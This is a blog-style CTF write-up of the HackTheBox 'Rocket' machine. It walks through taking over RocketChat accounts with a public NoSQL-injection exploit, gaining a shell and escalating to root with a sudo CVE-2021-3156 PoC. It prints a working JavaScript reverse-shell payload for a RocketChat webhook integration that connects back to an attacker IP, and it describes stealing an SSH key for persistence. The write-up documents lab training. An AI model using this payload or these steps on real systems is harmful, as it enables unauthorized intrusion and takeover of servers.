---
layout: post
title:  "HTB Business CTF 2021 - Rocket writeup"
date:   2021-07-29 20:00:00 +0300
categories: HTB_Business_CTF_2021 CTF
summary: Writeup for the Rocket challenge from HTB's Business CTF from 2021. This was part of their full pwn category which involved getting user and root flags from machines.
---

[Rocket](https://ctftime.org/task/16960) was a challenge at the HTB Business CTF 2021 from the 'Full PWN' category.  
These challenges were build like the usual machines from HTB's labs.  
You had to find a way to obtain access and then elevate your privileges on that machine.  
The objective was to find and submit two flags: user & root.  

# Recon

First, let's start with a port scan on this machine.  
![nmap results]({{site.baseurl}}/assets/img/HTB_Business_CTF_2021/rocket_nmap.png){: .center-image}

We can see that we have 3 ports open: 22, 80 and 3000.  
Port 22 has an OpenSSH server. I couldn't find any obvious issues with that so I'm not starting there considering that I haven't looked at the other ports yet.  
Let's start with 80. It has a web page for a web hosting business.

![Webpage on port 80]({{site.baseurl}}/assets/img/HTB_Business_CTF_2021/rocket_http.png){: .center-image}

I could see that some names and emails were displayed in there. I noted these down as they might be useful later on.
![First email found]({{site.baseurl}}/assets/img/HTB_Business_CTF_2021/rocket_email.png){: .center-image}

I also inspected the HTML for that elements. It was easier to copy data that way and this way I also made sure I was not missing any hidden elements.
So now my list of users/emails is:
- Elliot Alderson - elliot@rocket.htb
- Ezekiel Roberts - ezekiel@rocket.htb
- Emma Papadopoulos - emmap@rocket.htb
![All emails]({{site.baseurl}}/assets/img/HTB_Business_CTF_2021/rocket_emails.png){: .center-image}

Enough for port 80, let's check what's running on 3000 too.  
It looks like there's an instance of RocketChat on that port.  
Looks like this is where the machine gets its name.  

# Exploiting RocketChat

![Rocketchat]({{site.baseurl}}/assets/img/HTB_Business_CTF_2021/rocket_chat.png){: .center-image}

Looking up RocketChat on exploitDB i found [this](https://www.exploit-db.com/exploits/49960) exploit and I gave it a try.  
For multiple reasons the exploit was not working properly but the service was vulnerable. Time for troubleshooting.  

For that, let's begin by understanding what the exploit does. This is a simplified version that omits some details:
- the first part of the exploit takes over a regular user account by using blind noSQL injection and obtaining a password reset token  
This is quite slow as the token gets extracted one character at a time
- the second part of the exploit is attempting to use a similar method in order to obtain an admin account  
The main difference is that the exploit used for this requires access (that's why we previously got a regular account) and this will try to also obtain the code used for 2FA which is more commonly seen on admin accounts.
- the last part uses the admin account to create a new integration and obtain code execution on the machine

Now, I think the main reason why this does not work is because 2FA is not used so when the script tries to login expecting a one-time password it fails.  
However, the first part of the exploit (noSQL injection in order to take over an account) works perfectly. And because no 2FA is used for admin accounts we can take over these too if we want to.  
This is how it looks when the first part of the script is running.

![Rocketchat exploit]({{site.baseurl}}/assets/img/HTB_Business_CTF_2021/rocket_exploit.png){: .center-image}

After it is done, we can login as that user by using the newly reset password. You can see and change the password inside the script from exploitDB that we talked about above (by default it is P@$$w0rd!1234).  
First, I tried this with emmap@rocket.htb but I could only access some chat logs and nothing more.  
So I decided that it's time to try with a more privileged account: elliot@rocket.htb was stated to be 'Owner & CEO' so he should probably have more privileges.  

![Rocketchat exploit]({{site.baseurl}}/assets/img/HTB_Business_CTF_2021/rocket_exploit2.png){: .center-image}

After logging in as elliot we could see a list of users for RocketChat.  
You may have noticed that if you tried to also reset Ezekiel's account you couldn't. Here you can see the reason why: his email is different than the one appearing on the main website.  

![Rocket chat users]({{site.baseurl}}/assets/img/HTB_Business_CTF_2021/rocket_users.png){: .center-image}

# Getting a shell (user)

By using this account we also had access to the administration menu (at /admin).  
We'll use the last step from the exploit mentioned above in order to get a shell on the server. For that, we'll have to use the integrations menu.

![Integrations menu]({{site.baseurl}}/assets/img/HTB_Business_CTF_2021/rocket_integrations.png){: .center-image}

This allows us to define scripts and run them when a certain URL is accessed (webhooks).  
We can obviously exploit this by putting in a script that creates a reverse shell.  

We had to use JavaScript as this was the language used by RocketChat integrations, so here is our js payload:
{% highlight javascript %}
class Script {
  process_incoming_request({ request }) {
    const require = console.log.constructor('return process.mainModule.require')();
    const { execSync } = require('child_process');
    
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    
    client.connect(1337, "10.10.14.103", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    
    return {
      content:{
        text: JSON.stringify(res)
      }
    }
  }
}

{% endhighlight %}

![Payload]({{site.baseurl}}/assets/img/HTB_Business_CTF_2021/rocket_payload.png){: .center-image}

We create the new webhook and we get the URL and token that should be used to call it and execute the script.  
We use curl to access that URL and trigger the script. This was made simple by the fact that we could copy a curl command from the rocketChat UI.  

![Calling the endpoint with cURL]({{site.baseurl}}/assets/img/HTB_Business_CTF_2021/rocket_curl.png){: .center-image}

We look at the netcat listener that was left running and we have a shell.  
It looks like we're running as the "ezekiel" user.

![Getting a user shell]({{site.baseurl}}/assets/img/HTB_Business_CTF_2021/rocket_shell1.png){: .center-image}

# Persistent access

This is not something that I usually try on CTF boxes but on HTB machines this is often a feature.  
We can look in ~/.ssh at the authorized_keys files. In this case, the key of this user grants access to this box by using ssh.  
![Looking for ssh info]({{site.baseurl}}/assets/img/HTB_Business_CTF_2021/rocket_ssh1.png){: .center-image}

So, we can copy the private key to our local machine and use that to authenticate.  
As I said before, this is a common feature on HTB boxes. Especially when you get in through an exploit like this on a public box.  

![Logging in using ssh]({{site.baseurl}}/assets/img/HTB_Business_CTF_2021/rocket_ssh2.png){: .center-image}

# User flag
I almost forgot about the flag. Typical location for a HTB box: in the user's home directory. 

![User flag]({{site.baseurl}}/assets/img/HTB_Business_CTF_2021/rocket_user_flag.png){: .center-image}

# Privilege escalation

Now, let's find a way to escalate our privileges and get root.  
After I ran [linenum.sh](https://github.com/rebootuser/LinEnum) on the box, I noticed that the sudo version was a bit outdated.  

![User flag]({{site.baseurl}}/assets/img/HTB_Business_CTF_2021/rocket_sudo_version.png){: .center-image}

After a quick search, I found out that this version is vulnerable to CVE-2021-3156. I also found a PoC for that exploit [here](https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit).  
I moved the files to the server using scp because I already had the key obtained above & this was the simplest method.  

Conveniently enough, the server already had gcc and make so I could build the exploit right on that machine.

![User flag]({{site.baseurl}}/assets/img/HTB_Business_CTF_2021/rocket_root.png){: .center-image}

After running it, I got a root shell & I could get the root flag too.

![User flag]({{site.baseurl}}/assets/img/HTB_Business_CTF_2021/rocket_root_flag.png){: .center-image}
